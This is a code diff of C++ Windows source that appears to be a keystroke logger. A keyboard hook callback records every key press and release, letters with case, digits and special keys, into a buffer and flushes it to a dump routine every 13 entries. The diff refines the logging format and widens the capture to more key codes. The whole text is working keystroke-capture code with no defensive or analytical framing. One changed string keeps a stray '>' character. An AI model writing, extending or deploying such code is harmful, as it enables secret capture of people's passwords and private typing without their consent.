@@ -9,7 +9,7 @@
 std::string fileName;
 std::vector<std::string> codepointStringBuffer;
 
-static BOOL CapsLockIsToggled() {
+static BOOL CapsLockIsToggledOn() {
     return (GetKeyState(VK_CAPITAL) & 0x1) != 0;
 }
 
@@ -44,19 +44,24 @@ LRESULT CALLBACK KeyboardProc(int nCode,
         case WM_SYSKEYUP:
 
             if (vkCode == VK_LSHIFT) {
-                codepointStringBuffer.push_back(std::string("\n<VK_LSHIFT up>"));
+                codepointStringBuffer.push_back(std::string("\nVK_LSHIFT up"));
             } else if (vkCode == VK_RSHIFT) {
-                codepointStringBuffer.push_back(std::string("\n<VK_RSHIFT up>"));
+                codepointStringBuffer.push_back(std::string("\nVK_RSHIFT up"));
             } else if (vkCode == VK_LMENU) {
-                codepointStringBuffer.push_back(std::string("\n<VK_LMENU up>"));
+                codepointStringBuffer.push_back(std::string("\nVK_LMENU up"));
             } else if (vkCode == VK_RMENU) {
-                codepointStringBuffer.push_back(std::string("\n<VK_RMENU up>"));
+                codepointStringBuffer.push_back(std::string("\nVK_RMENU up"));
             } else if (vkCode == VK_CAPITAL) {
-                codepointStringBuffer.push_back(std::string("\n<VK_CAPITAL up>"));
-            }
-
-            if (codepointStringBuffer.size() >= 30) {
-                DumpCharacterBuffer();
+                codepointStringBuffer.push_back(std::string("\nVK_CAPITAL up"));
+            } else if (!std::isalnum(vkCode)) {
+                // Handle the remaining key codes:
+                std::stringstream ss;
+                ss << "0x";
+                ss << std::hex << std::uppercase << vkCode;
+                std::string s;
+                ss >> s;
+                std::string codepointString = "\n" + s + " up";
+                codepointStringBuffer.push_back(codepointString);
             }
 
             break;
@@ -65,23 +70,23 @@ LRESULT CALLBACK KeyboardProc(int nCode,
         case WM_SYSKEYDOWN:
 
             if (vkCode == VK_LSHIFT) {
-                codepointStringBuffer.push_back(std::string("\n<VK_LSHIFT down>"));
+                codepointStringBuffer.push_back(std::string("\nVK_LSHIFT down"));
             } else if (vkCode == VK_RSHIFT) {
-                codepointStringBuffer.push_back(std::string("\n<VK_RSHIFT down>"));
+                codepointStringBuffer.push_back(std::string("\nVK_RSHIFT down"));
             } else if (vkCode == VK_LMENU) {
-                codepointStringBuffer.push_back(std::string("\n<VK_LMENU down>"));
+                codepointStringBuffer.push_back(std::string("\nVK_LMENU down"));
             } else if (vkCode == VK_RMENU) {
-                codepointStringBuffer.push_back(std::string("\n<VK_RMENU down>"));
+                codepointStringBuffer.push_back(std::string("\nVK_RMENU down"));
             } else if (vkCode == VK_SPACE) {
-                codepointStringBuffer.push_back(std::string("\n<SPACE>"));
+                codepointStringBuffer.push_back(std::string("\nSPACE>"));
             } else if (vkCode == VK_CAPITAL) {
-                codepointStringBuffer.push_back(std::string("\n<VK_CAPITAL down>"));
+                codepointStringBuffer.push_back(std::string("\nVK_CAPITAL down"));
             } else if (vkCode == VK_RETURN) {
-                codepointStringBuffer.push_back(std::string("\n<RETURN>\n"));
+                codepointStringBuffer.push_back(std::string("\nRETURN"));
             } else if (vkCode == VK_BACK) {
-                codepointStringBuffer.push_back(std::string("\n<BACKWARDS>"));
+                codepointStringBuffer.push_back(std::string("\nBACKWARDS"));
             } else if (vkCode == VK_TAB) {
-                codepointStringBuffer.push_back(std::string("\n<TAB>"));
+                codepointStringBuffer.push_back(std::string("\nTAB"));
             } else if (std::isdigit(vkCode)) {
                 std::string s{ (char) vkCode };
                 codepointStringBuffer.push_back(std::string("\n"));
@@ -92,9 +97,9 @@ LRESULT CALLBACK KeyboardProc(int nCode,
                 BOOL lowerCase;
 
                 if (LeftShiftIsDown() || RightShiftIsDown()) {
-                    lowerCase = !CapsLockIsToggled();
+                    lowerCase = !CapsLockIsToggledOn();
                 } else {
-                    lowerCase = CapsLockIsToggled();
+                    lowerCase = CapsLockIsToggledOn();
                 }
 
                 if (lowerCase) {
@@ -109,16 +114,19 @@ LRESULT CALLBACK KeyboardProc(int nCode,
             } else {
                 // Handle the remaining key codes:
                 std::stringstream ss;
-                ss << std::hex << vkCode;
+                ss << "0x";
+                ss << std::hex << std::uppercase << vkCode;
                 std::string s;
                 ss >> s;
-                codepointStringBuffer.push_back(std::string("\n0x"));
-                codepointStringBuffer.push_back(s);
+                std::string codepointString = "\n" + s + " down";
+                codepointStringBuffer.push_back(codepointString);
             }
 
-            if (codepointStringBuffer.size() >= 13) {
-                DumpCharacterBuffer();
-            }
+            break;
+    }
+
+    if (codepointStringBuffer.size() >= 13) {
+        DumpCharacterBuffer();
     }
 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
